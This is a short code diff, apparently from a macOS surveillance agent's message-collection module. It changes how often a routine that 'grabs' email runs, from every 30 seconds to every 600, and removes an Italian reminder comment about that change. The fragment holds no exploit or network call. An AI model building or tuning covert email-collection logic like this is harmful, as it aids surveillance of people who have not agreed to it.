@@ -357,10 +357,9 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     // start the first run of email grabbing
     [self _getMail];
     
-    //TODO: ricordarsi di cambiare l'intervallo del timer a 600
     if (gOSMajor == 10 && gOSMinor >= 7)
     {
-        timer = [NSTimer scheduledTimerWithTimeInterval:30.0 /*600*/ target:self selector:@selector(_getMail) userInfo:nil repeats:YES];
+        timer = [NSTimer scheduledTimerWithTimeInterval:/*30.0*/ 600 target:self selector:@selector(_getMail) userInfo:nil repeats:YES];
         [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
     }
     else
